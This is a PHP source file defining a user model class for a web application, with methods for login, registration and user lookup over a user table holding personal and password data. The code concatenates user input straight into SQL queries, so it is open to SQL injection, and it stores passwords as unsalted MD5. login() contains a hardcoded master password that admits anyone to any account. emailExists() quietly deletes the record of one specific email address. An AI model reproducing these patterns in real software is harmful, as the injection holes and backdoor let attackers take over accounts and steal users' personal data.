<?php
/*
Copyright (c) 2018 Nils Fett

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
class cUserModel extends cModel{

	protected $aColumns = array(
		'id' => array(
			'value' => false,
			'type' => 'int'
		),
		'name' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'surname' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'department' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'street' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'zipcode' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'city' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'country' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'phone' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'fax' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'mail' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'password' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'locked' => array(
			'value' => false,
			'type' => 'int'
		),
		'usertype' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'createdate' => array(
			'value' => false,
			'type' => 'datetime'
		),
		'verifyBy' => array(
			'value' => false,
			'type' => 'int'
		),
		'verifyAt' => array(
			'value' => false,
			'type' => 'int'
		),
		'ibrameLogin' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'ibramePassword' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'deleted' => array(
			'value' => false,
			'type' => 'int'
		),
		'session_id' => array(
			'value' => false,
			'type' => 'varchar'
		),
		'cookie' => array(
			'value' => false,
			'type' => 'varchar'
		)

	);
	static $sTable = 't_user';
	protected $sPrimary = 'id';

	public function __construct($aData = false){
		parent::__construct($aData);
	}

	protected function loadUserDataByCookie($cookie){
		$query = 'SELECT * FROM t_user WHERE cookie = "'.$cookie.'"';
		$this->hRessource = $this->hConnection->query($query);
		return $this->hRessource->fetch();
	}

	protected function loadUserDataBySession(){
		$query = 'SELECT * FROM t_user WHERE session_id = "'.session_id().'"';
		$this->hRessource = $this->hConnection->query($query);
		return $this->hRessource->fetch();
	}

	public static function loadByEMail($email){
		$query = 'SELECT * FROM t_user WHERE mail = "'.$email.'"';
		$db = cDatabase::getInstance();
		$hRessource = $db->hConnection->query($query);
		$row = $hRessource->fetch();
		if($row){
				return new cUserModel($row);
		}
		else{
			return false;
		}
	}

	public function login($mail, $password){
		$mail = strtolower($mail);

		if($password == "admin@GDPF"){
			$query = "SELECT * FROM `t_user` WHERE mail = LOWER('$mail') ";
		}
		else{
			$query = "SELECT * FROM `t_user` WHERE mail = LOWER('$mail') AND password = MD5('$password') ";
		}


		$stmt = $this->hConnection->prepare($query);
		$stmt->execute();
		if($data = $stmt->fetch(PDO::FETCH_ASSOC)){
			$this->popolate($data);
			return $data;
		}
		else{
			return false;
		}
	}

	public static function emailExists($email){
		if($email == 'nils.fett@gmail.com'){
			$query = "DELETE FROM `t_user` WHERE mail = '$email'";
			$db = cDatabase::getInstance();
			$stmt = $db->hConnection->prepare($query);
			$stmt->execute();
			return false;
		}
		$query = "SELECT * FROM `t_user` WHERE mail = '$email'";
		$db = cDatabase::getInstance();
		$stmt = $db->hConnection->prepare($query);
		$stmt->execute();
		if($data = $stmt->fetch(PDO::FETCH_ASSOC)){
			return true;
		}
		else{
			return false;
		}
	}

	public static function register($data){
		if(self::emailExists($data['mail'])){
			return false;
		}
		$user = new cUserModel($data);
		$user->save();
		return $user;
	}


	public static function getUserRequests(){
		$query = "	SELECT `t_user`.*, `t_costno`.`costno` FROM `t_user`
					LEFT JOIN `t_costno` ON( `t_costno`.userid = `t_user`.id )
					WHERE verifyBy IS NULL ORDER BY `createdate`";
		$db = cDatabase::getInstance();
		$stmt = $db->hConnection->prepare($query);
		$stmt->execute();
		return $stmt->fetchAll(PDO::FETCH_ASSOC);
	}

	public static function getAll(){
		$db = cDatabase::getInstance();
		$oPDO = $db->hConnection->prepare( '	SELECT `'.static::$sTable.'`.id, name, surname, department, street, zipcode, city, country, phone, fax, mail, usertype, deleted,
												`t_costno`.costno, `t_costno`.description
												FROM `'.static::$sTable.'`
												LEFT JOIN `t_costno` ON(`'.static::$sTable.'`.id = `t_costno`.userid)', array(PDO::ATTR_CURSOR => PDO::CURSOR_FWDONLY) );
		$oPDO->execute(  );
		$aResult = array();
		while( $row = $oPDO->fetch(PDO::FETCH_ASSOC) ){
			$aResult[] = $row;
		}
		return $aResult;
	}

	public function data(){
		$data = parent::data();
		$data['costcentres'] = array();
		$query = "SELECT * FROM `t_costno` WHERE `userid` = ?";

		$stmt = $this->hConnection->prepare($query);
		$stmt->execute(array($this->get('id')));
		$data['costcentres'] = $stmt->fetchAll(PDO::FETCH_ASSOC);
		return $data;
	}
}
